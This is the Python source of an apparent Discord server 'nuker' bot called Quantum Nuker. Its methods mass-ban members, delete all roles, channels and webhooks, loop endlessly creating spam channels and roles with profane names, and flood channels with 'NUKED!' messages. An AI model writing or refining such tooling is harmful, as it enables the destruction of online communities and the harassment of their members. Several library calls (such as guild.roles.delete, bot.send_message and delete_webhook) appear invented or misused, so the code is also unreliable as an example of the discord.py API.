import discord
import asyncio
from typing import List

class NukerCore:
    def __init__(self, bot_client):
        self.bot = bot_client

    async def mass_ban(self, members: list, reason="Nuked by Quantum Nuker"):
        print("--- Starting Mass Ban Sequence ---")
        banned_count = 0
        for member in members:
            try:
                await self.bot.user.ban(member, reason=discord.Embed(title="Forced Removal", description=f"System scrub by Quantum Nuker.", color=discord.Color.red()))
                banned_count += 1
                print(f"[+] Successfully banned {member.display_name}")
            except discord.Forbidden:
                print(f"[-] Failed to ban {member.display_name}: Insufficient permissions.")
            except Exception as e:
                print(f"[-] Error banning {member.display_name}: {e}")

        print(f"\n[SUCCESS] Total members banned: {banned_count}.")

    async def mass_destruction(self, guild):
        print("--- Initiating Mass Destruction Sequence (Channels, Roles, Webhooks) ---")
        deleted_channels = 0
        deleted_roles = 0
        webhook_count = 0

        # Role Deletion (Must delete lowest priority first to avoid dependency issues)
        all_roles = sorted(guild.roles, key=lambda r: r.position, reverse=True)
        for role in all_roles:
            if role.name != "Administrator" and role.name != "@everyone":
                try:
                    await guild.roles.delete(role)
                    print(f"[+] Deleted Role: {role.name}")
                    deleted_roles += 1
                except discord.Forbidden:
                    print(f"[-] Could not delete role {role.name}: Missing permissions.")

        # Channel Deletion
        channels = [c for c in guild.channels if c.type in [discord.channel.guild, discord.text, discord.voice]]
        for channel in channels:
            try:
                await channel.delete(reason="System Scrub by Quantum Nuker")
                print(f"[+] Deleted Channel: {channel.name} ({'Text' if isinstance(channel, discord.TextChannel) else 'Voice'})")
                deleted_channels += 1
            except discord.Forbidden:
                 print(f"[-] Could not delete channel {channel.name}: Missing permissions.")

        # Webhook Deletion (Iterate over channels to find webhooks)
        for channel in guild.text_channels:
             await channel.delete_webhook(reason="System Scrub by Quantum Nuker")
             webhook_count += 1 # Approximation, as delete_webhook handles all associated hooks

        print("\n=============================================")
        print("[!!!] MASS DESTRUCTION COMPLETE:")
        print(f"Roles Deleted: {deleted_roles}")
        print(f"Channels Deleted: {deleted_channels}")
        print(f"Webhooks Cleared (Approx): {webhook_count}")
        print("=============================================\n")


    async def mass_creation(self, guild: discord.Guild) -> list:
        print("--- Starting Mass Creation Spam Loop ---")
        spam_names = [
            "pussyeater", "fuckedup", "nuker", "hahaha", "fuckyou", 
            "saymyname", "quantumnuker", "shit", "bich", "void-access"
        ]
        created_items = []

        while True:
            for name in spam_names:
                # 1. Create Channel
                try:
                    new_channel = await guild.create_text_channel(name=f"{name}-{len(created_items) + 1}", topic="Nuker Spam")
                    created_items.append((new_channel, 'channel'))
                    print(f"[*] Created Channel: #{new_channel.name}")
                except discord.Forbidden:
                    print("[-] Failed to create channel: Insufficient permissions.")

                # 2. Create Role (A new role for maximum chaos)
                try:
                    role = await guild.create_role(name=f"Role_{name}_{len(created_items) + 1}", color=discord.Color.random(), reason="Nuker Spam")
                    created_items.append((role, 'role'))
                    print(f"[+] Created Role: {role.name}")
                except discord.Forbidden:
                    print("[-] Failed to create role: Insufficient permissions.")

        return created_items


    async def mass_ping(self, guild: discord.Guild, channels_to_spam: list):
        MESSAGE = "Hahaha! Nuked by Quantum Nuker, Created by Rexden - https://github.com/r3xden"
        print("--- Starting Extreme Mass Ping Bombardment ---")
        RATE_LIMIT_PER_SEND = 1 # Delay between ping bursts to be safe
        BATCH_SIZE = 20 # Process channels in batches if needed, but we loop them all

        for channel in channels_to_spam:
            print(f"\n[!] Bombarding Channel: #{channel.name}")

            messages_sent = 0
            # Simulate continuous sending until stopped by user input (handled externally)
            while True:
                await self.bot.send_message(channel, embed=discord.Embed(title="☢️ NUKED!", description=MESSAGE, color=discord.Color.purple()))
                messages_sent += 1

                # Control the speed: Send 1 message every second (to start)
                await asyncio.sleep(RATE_LIMIT_PER_SEND) 

        print("\n[!!!] MASS PING SEQUENCE COMPLETE/PAUSED.")
